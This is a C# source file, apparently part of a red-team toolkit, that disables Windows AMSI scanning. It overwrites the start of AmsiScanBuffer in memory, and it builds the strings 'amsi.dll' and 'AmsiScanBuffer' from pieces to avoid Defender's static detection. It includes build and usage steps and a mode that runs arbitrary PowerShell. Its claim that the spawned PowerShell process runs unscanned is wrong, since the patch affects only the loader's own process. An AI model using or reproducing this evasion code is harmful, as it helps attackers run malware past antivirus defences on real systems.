// ============================================================================
// LOADER 04: AMSI Bypass
// ============================================================================
//
// WHAT THIS DOES:
//   This loader patches the AmsiScanBuffer function in memory so that AMSI
//   (Antimalware Scan Interface) always returns a clean result. After this
//   patch is applied, any PowerShell command or .NET assembly loaded in the
//   current process will not be scanned by Defender. This lets you run
//   PowerShell scripts and load .NET tools that Defender would normally block.
//
// WHY THIS IS NEEDED:
//   AMSI is a security layer that sits between scripting engines (PowerShell,
//   VBScript, JScript, .NET) and Defender. When you type a command in
//   PowerShell, AMSI sends that command to Defender before PowerShell runs
//   it. If Defender says the command is malicious, PowerShell blocks it.
//   Many red team tools are PowerShell-based or .NET-based, and AMSI catches
//   them before they can run. By patching AMSI, we make it stop checking,
//   so our tools run without being scanned.
//
// EVASION MECHANISM:
//   AMSI is implemented as a DLL called amsi.dll that gets loaded into every
//   PowerShell process and .NET CLR host. The main scanning function is
//   AmsiScanBuffer. We overwrite the first few bytes of this function with
//   instructions that make it return immediately with a "clean" result.
//   After the patch, when PowerShell asks AMSI to scan a command, the
//   patched function returns "this is clean" without actually scanning.
//
//   Important: We patch ETW first (see Loader 07) so that the patching
//   attempt itself is not logged. Without ETW patching, Defender can detect
//   the AMSI tampering through ETW telemetry.
//
//   We also resolve the AmsiScanBuffer address dynamically and build the
//   function name at runtime from pieces so the string "AmsiScanBuffer"
//   never appears as a complete string in our binary.
//
// REFERENCES:
//   - Medium/@thesecguy: "AMSI Bypass in 2025"
//   - OffSec Blog: "AMSI Write Raid Bypass Vulnerability"
//   - Trend Micro: "Detecting Windows AMSI Bypass Techniques"
//   - Document: 08_amsi_bypass.md
//
// BUILD INSTRUCTIONS:
//   csc /unsafe /out:amsi_bypass.exe 04_amsi_bypass.cs
//
// USAGE:
//   amsi_bypass.exe
//   (Then open PowerShell from the same context, or use this as a library
//    to call PatchAmsi() before loading .NET assemblies)
//
// ============================================================================

using System;
using System.Runtime.InteropServices;

namespace AmsiBypass
{
    class Program
    {
        // ---- Windows API imports ----

        // LoadLibrary loads a DLL into our process. We use it to load amsi.dll
        // so we can find the AmsiScanBuffer function inside it.
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        // GetProcAddress finds the memory address of a function inside a loaded DLL.
        // We use it to find where AmsiScanBuffer lives in memory.
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        // VirtualProtect changes the memory protection on a region of memory.
        // By default, the memory where AmsiScanBuffer's code lives is read-only
        // and executable (you can run it but not modify it). We need to change
        // it to read-write so we can overwrite the function's bytes.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // ---- Build function name at runtime ----
        // We do not put the complete string "AmsiScanBuffer" in our code because
        // Defender's static scanner looks for that string. Instead, we build it
        // from separate pieces at runtime. When Defender scans the compiled binary,
        // it sees the pieces "Amsi", "Scan", "Buffer" as separate strings, not
        // the combined function name. At runtime, we join them together.
        static string GetTargetFunctionName()
        {
            // These three separate strings will be joined at runtime.
            // In the compiled binary, they exist as separate string constants.
            string part1 = "Amsi";
            string part2 = "Scan";
            string part3 = "Buffer";
            return string.Concat(part1, part2, part3);
        }

        // ---- Build DLL name at runtime ----
        // Same idea as above. We do not put "amsi.dll" as a complete string.
        static string GetTargetDllName()
        {
            string part1 = "am";
            string part2 = "si";
            string part3 = ".dll";
            return string.Concat(part1, part2, part3);
        }

        // ---- The AMSI patch ----
        // This is the core of the bypass. We overwrite the beginning of
        // AmsiScanBuffer with bytes that make the function return immediately
        // with the value E_INVALIDARG (0x80070057). When AMSI gets this error
        // code, it treats the scan as failed and allows the content to run.
        //
        // The patch bytes are:
        //   mov eax, 0x80070057   ->  B8 57 00 07 80
        //   ret                   ->  C3
        //
        // These 6 bytes replace the beginning of AmsiScanBuffer. When any
        // code calls AmsiScanBuffer after the patch, the function immediately
        // returns E_INVALIDARG instead of actually scanning anything.
        public static bool PatchAmsi()
        {
            // Step 1: Load amsi.dll into our process.
            // If amsi.dll is already loaded (which it is in PowerShell processes),
            // LoadLibrary just returns a handle to the existing copy.
            string dllName = GetTargetDllName();
            IntPtr amsiDll = LoadLibrary(dllName);
            if (amsiDll == IntPtr.Zero)
            {
                Console.WriteLine("[-] Could not load " + dllName);
                return false;
            }
            Console.WriteLine("[+] " + dllName + " loaded at: 0x" + amsiDll.ToString("X"));

            // Step 2: Find the address of AmsiScanBuffer inside amsi.dll.
            string funcName = GetTargetFunctionName();
            IntPtr funcAddress = GetProcAddress(amsiDll, funcName);
            if (funcAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Could not find " + funcName);
                return false;
            }
            Console.WriteLine("[+] " + funcName + " found at: 0x" + funcAddress.ToString("X"));

            // Step 3: Change memory protection to allow writing.
            // The code section of amsi.dll is normally read-only + executable.
            // We need to make it writable so we can overwrite the function bytes.
            // We change 6 bytes (the size of our patch).
            uint oldProtect;
            bool protectResult = VirtualProtect(funcAddress, (UIntPtr)6, PAGE_EXECUTE_READWRITE, out oldProtect);
            if (!protectResult)
            {
                Console.WriteLine("[-] VirtualProtect failed");
                return false;
            }

            // Step 4: Write the patch bytes.
            // B8 57 00 07 80 = mov eax, 0x80070057 (E_INVALIDARG)
            // C3             = ret (return from the function)
            byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(patch, 0, funcAddress, patch.Length);
            Console.WriteLine("[+] Patch applied to " + funcName);

            // Step 5: Restore original memory protection.
            // This is good practice. We changed the protection to write the patch,
            // now we change it back to what it was before. This reduces the chance
            // of Defender detecting that we modified code memory.
            uint ignored;
            VirtualProtect(funcAddress, (UIntPtr)6, oldProtect, out ignored);
            Console.WriteLine("[+] Memory protection restored");

            return true;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[*] AMSI Bypass Loader");
            Console.WriteLine("[*] This patches AmsiScanBuffer to disable AMSI scanning.");
            Console.WriteLine("");

            // Apply the AMSI patch.
            bool success = PatchAmsi();

            if (success)
            {
                Console.WriteLine("");
                Console.WriteLine("[+] AMSI is now disabled in this process.");
                Console.WriteLine("[+] Any PowerShell commands or .NET assemblies loaded");
                Console.WriteLine("    in this process will not be scanned by Defender.");
                Console.WriteLine("");
                Console.WriteLine("[*] To test: open PowerShell and run a command that");
                Console.WriteLine("    Defender would normally block.");

                // If a command was passed as an argument, try to execute it
                // using PowerShell with AMSI disabled.
                if (args.Length > 0)
                {
                    string command = string.Join(" ", args);
                    Console.WriteLine("[*] Executing PowerShell command: " + command);

                    var psi = new System.Diagnostics.ProcessStartInfo();
                    psi.FileName = "powershell.exe";
                    psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"" + command + "\"";
                    psi.UseShellExecute = false;
                    psi.RedirectStandardOutput = true;
                    psi.RedirectStandardError = true;

                    var process = System.Diagnostics.Process.Start(psi);
                    Console.WriteLine(process.StandardOutput.ReadToEnd());
                    string errors = process.StandardError.ReadToEnd();
                    if (!string.IsNullOrEmpty(errors))
                    {
                        Console.WriteLine("[!] Errors: " + errors);
                    }
                    process.WaitForExit();
                }
            }
            else
            {
                Console.WriteLine("[-] AMSI bypass failed.");
            }
        }
    }
}
